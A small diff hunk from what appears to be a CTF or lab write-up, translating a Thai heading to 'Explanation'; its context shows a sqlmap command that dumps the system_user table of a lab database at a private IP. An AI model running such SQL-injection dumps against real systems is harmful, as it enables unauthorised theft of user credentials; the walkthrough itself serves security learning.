@@ -185,7 +185,7 @@ sqlmap -u "http://10.10.28.30/products/3*" -D duckyinc --dump -T system_user
 ```
 ![Sqlmap](images/13.png)
 
-📝 **คำอธิบาย:**
+📝 **Explanation:**
 
 - `-T system_user` specifies the table to dump
 
